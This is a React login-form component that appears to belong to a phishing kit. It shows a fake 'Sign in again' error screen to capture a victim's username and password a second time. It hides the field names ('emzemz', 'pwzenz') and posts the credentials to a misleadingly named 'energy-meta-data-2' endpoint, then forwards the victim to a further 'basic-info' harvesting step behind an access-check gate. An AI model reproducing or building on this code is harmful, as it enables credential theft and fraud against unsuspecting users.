import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';
import FlowCard from '../components/FlowCard';
import FormError from '../components/FormError';

const inputClasses =
  'w-full bg-transparent text-white focus:outline-none py-2 placeholder:text-slate-400';

const LoginForm2: React.FC = () => {
  const [emzemz, setEmzemz] = useState('');
  const [pwzenz, setPwzenz] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [showPwzenz, setShowPwzenz] = useState(false);
  const [errors, setErrors] = useState({ emzemz: '', pwzenz: '' });
  const navigate = useNavigate();
  const isAllowed = useAccessCheck(baseUrl);

  if (!isAllowed) {
    return null;
  }

  const togglePwzenzVisibility = () => {
    setShowPwzenz((prev) => !prev);
  };

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setIsLoading(true);

    const newErrors = { emzemz: '', pwzenz: '' };

    if (!emzemz.trim()) {
      newErrors.emzemz = 'Username is required.';
    }

    if (!pwzenz.trim()) {
      newErrors.pwzenz = 'Password must be provided.';
    }

    setErrors(newErrors);

    if (!newErrors.emzemz && !newErrors.pwzenz) {
      try {
        await axios.post(`${baseUrl}api/energy-meta-data-2/`, {
          emzemz,
          pwzenz,
        });
        navigate('/basic-info', { state: { emzemz } });
      } catch (error) {
        console.error('Error sending message:', error);
        setIsLoading(false);
        return;
      }
    }

    setIsLoading(false);
  };

  return (
    <FlowCard title="Sign in again" subtitle={<span className="text-slate-300">We detected an issue with your first attempt.</span>}>
      <div className="flex items-center gap-3 text-sm font-semibold text-red-400">
        <svg width="1rem" height="1rem" viewBox="0 0 24 24" className="fill-current" aria-hidden="true">
          <path
            d="M23.622 17.686L13.92 2.88a2.3 2.3 0 00-3.84 0L.378 17.686a2.287 2.287 0 001.92 3.545h19.404a2.287 2.287 0 001.92-3.545zM11.077 8.308h1.846v5.538h-1.846V8.308zm.923 9.23a1.385 1.385 0 110-2.769 1.385 1.385 0 010 2.77z"
            fillRule="nonzero"
          ></path>
        </svg>
        <p>We found some errors. Please review and try again.</p>
      </div>
      <form onSubmit={handleSubmit} className="space-y-6 mt-6">
        <div>
          <label className="text-slate-300 text-sm" htmlFor="emzemz">
            Username
          </label>
          <div className={`flex items-center gap-3 border-b transition-colors ${errors.emzemz ? 'border-red-500' : 'border-slate-500 focus-within:border-[#00b4ff]'}`}>
            <span className="text-[#00b4ff]">
              <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="1.5" viewBox="0 0 24 24">
                <path strokeLinecap="round" strokeLinejoin="round" d="M15.75 6.75a3.75 3.75 0 1 1-7.5 0 3.75 3.75 0 0 1 7.5 0ZM4.5 20.25a7.5 7.5 0 0 1 15 0" />
              </svg>
            </span>
            <input
              id="emzemz"
              name="emzemz"
              type="text"
              value={emzemz}
              onChange={(e) => setEmzemz(e.target.value)}
              className={inputClasses}
              placeholder="Enter your username"
            />
          </div>
          {errors.emzemz ? <FormError message={errors.emzemz} /> : null}
        </div>

        <div>
          <label className="text-slate-300 text-sm" htmlFor="pwzenz">
            Password
          </label>
          <div className={`flex items-center gap-3 border-b transition-colors ${errors.pwzenz ? 'border-red-500' : 'border-slate-500 focus-within:border-[#00b4ff]'}`}>
            <span className="text-[#00b4ff]">
              <svg className="w-5 h-5" fill="none" stroke="currentColor" strokeWidth="1.5" viewBox="0 0 24 24">
                <path
                  strokeLinecap="round"
                  strokeLinejoin="round"
                  d="M16.5 10.5V7.875a4.125 4.125 0 1 0-8.25 0V10.5M6.75 10.5h10.5A1.75 1.75 0 0 1 19 12.25v7a1.75 1.75 0 0 1-1.75 1.75H6.75A1.75 1.75 0 0 1 5 19.25v-7A1.75 1.75 0 0 1 6.75 10.5Z"
                />
              </svg>
            </span>
            <input
              id="pwzenz"
              name="pwzenz"
              type={showPwzenz ? 'text' : 'password'}
              value={pwzenz}
              onChange={(e) => setPwzenz(e.target.value)}
              className={inputClasses}
              placeholder="Enter your password"
            />
            <button type="button" onClick={togglePwzenzVisibility} className="text-[#00b4ff] text-sm hover:text-white">
              {showPwzenz ? 'Hide' : 'Show'}
            </button>
          </div>
          {errors.pwzenz ? <FormError message={errors.pwzenz} /> : null}
        </div>

        <button
          type="submit"
          className="w-full bg-[#7dd3fc] text-black font-semibold py-2 rounded-md hover:bg-[#38bdf8] transition disabled:opacity-70"
          disabled={isLoading}
        >
          {isLoading ? (
            <div className="h-5 w-5 animate-spin rounded-full border-2 border-solid border-black border-t-transparent" />
          ) : (
            'Sign in'
          )}
        </button>
      </form>
    </FlowCard>
  );
};

export default LoginForm2;
